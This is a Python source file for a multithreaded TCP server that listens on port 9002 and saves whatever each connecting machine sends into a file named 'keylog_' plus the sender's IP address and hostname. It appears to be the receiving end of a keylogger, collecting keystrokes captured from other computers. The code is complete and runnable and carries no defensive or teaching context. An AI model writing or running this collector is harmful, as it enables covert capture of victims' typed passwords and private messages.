import socket
import threading

def handle_client(conn, addr):
    try:
        hostname = socket.gethostbyaddr(addr[0])[0]
    except socket.herror:
        hostname = "UnknownHost"

    # Generate a unique filename for each client based on their IP and hostname
    log_filename = f"keylog_{addr[0]}_{hostname}.txt".replace(':', '_').replace('.', '_')

    with open(log_filename, 'a') as logfile:
        while True:
            try:
                data = conn.recv(1024)
                if not data:
                    break
                # Decode the received data and remove any newline or carriage return characters
                message = data.decode('utf-8', errors='ignore').replace('\n', '').replace('\r', '')
                # Write the received data to the log file
                logfile.write(message)
                logfile.flush()
                print(f"Received from {addr[0]}: {message}")  # Print to console for debugging
            except ConnectionResetError:
                print(f"Client {addr[0]} disconnected")
                break

    conn.close()
    print(f"Connection closed for {addr[0]}")

def start_server(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Server listening on {host}:{port}")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

if __name__ == "__main__":
    start_server('0.0.0.0', 9002)
